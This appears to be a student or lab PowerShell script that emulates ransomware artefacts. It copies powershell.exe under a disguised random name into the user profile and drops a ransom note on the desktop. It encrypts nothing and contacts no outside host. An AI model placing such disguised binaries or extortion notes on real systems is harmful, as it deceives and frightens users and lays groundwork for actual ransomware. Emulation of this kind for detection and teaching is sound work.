#Create a random number to end the file name then name the file
$rwRand = Get-random -Minimum 1000 -Maximum 9876

#Set up the files
$rwDir = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" 
$rwDest = "$env:USERPROFILE\EnNoB-$rwRand.exe"
$rwnDest =  "$env:USERPROFILE\Desktop\README.READ"

#Copy the file to the new destinatio
Copy-Item $rwDir -Destination $rwDest

#Test to see if the file exists
if (Test-Path -Path $rwDest -PathType Leaf){
    Write-Output "File Found"
} else {
    Write-Output "File Not Found"
}

#Write the Note
$rwNote = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."

#Put the file to desktop
$rwNote | Out-File -FilePath $rwnDest

#Test to see if the note exists
if (Test-Path -Path $rwnDest -PathType Leaf) {
    Write-Output "Note Found"
} else {
    Write-Output "Note Not Found"
}